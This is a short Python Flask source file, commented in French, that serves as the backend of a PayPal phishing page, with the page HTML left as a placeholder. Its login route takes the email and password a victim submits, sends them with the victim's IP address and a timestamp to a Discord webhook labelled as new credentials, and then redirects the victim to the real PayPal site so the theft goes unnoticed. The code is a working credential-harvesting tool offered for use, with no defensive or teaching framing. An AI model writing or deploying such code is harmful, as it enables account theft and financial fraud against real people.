from flask import Flask, request, render_template_string, redirect
import requests
import datetime
import os

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')

PAGE = '''<!DOCTYPE html>...'''  # Colle le HTML complet

@app.route('/')
def home():
    return PAGE

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    if DISCORD_WEBHOOK:
        payload = {'content': '🔐 NOUVEAUX IDENTIFIANTS', 'embeds': [{'title': 'PayPal', 'color': 0x0070ba, 'fields': [{'name': 'Email', 'value': email}, {'name': 'Mot de passe', 'value': password}, {'name': 'IP', 'value': request.remote_addr}], 'footer': {'text': datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}}]}
        try:
            requests.post(DISCORD_WEBHOOK, json=payload)
        except:
            pass
    return redirect('https://www.paypal.com')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
